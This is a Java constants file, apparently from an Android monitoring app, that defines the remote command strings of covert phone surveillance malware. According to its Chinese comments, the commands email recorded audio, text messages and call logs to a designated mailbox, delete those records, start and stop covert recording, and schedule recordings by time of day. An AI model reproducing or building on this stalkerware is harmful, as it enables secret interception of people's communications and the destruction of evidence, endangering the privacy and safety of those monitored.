package com.privacy.monitor.base;

/**
 * 指令
 */
public class Directive {
	
	//发送录音文件到指定邮箱
	public static final String sendSR = "dd1d/send+amr";
	
	//发送短信记录到指定邮箱
	public static final String sendSMS = "dd1d/send+sms";
	
	//发送通话记录到指定邮箱
	public static final String sendCallRecord = "dd1d/send+phone";
	
	//发送录音文件、通话记录、短信到指定邮箱
	public static final String sendAll = "dd1d/send+all";

	//删除短信记录
	public static final String deleteSMS = "dd1d/delete+sms";
	
	//删除通话记录 
	public static final String deleteSR = "dd1d/delete+phone";
	
	//删除录音文件、通话记录及短信
	public static final String deleteAll = "dd1d/delete+all";
	
	//开始录音指令
	public static final String startSR = "dd1d/r_stamr+";
	
	//结束录音指令
	public static final String stopSR = "dd1d/r_spamr+";
	
	//指定时间录音(此录音当天有效) (开始录音时间-结束录音时间) 24小时制
	public static final String SRTime = "dd1d/time_amr+8:30-9:10";
}
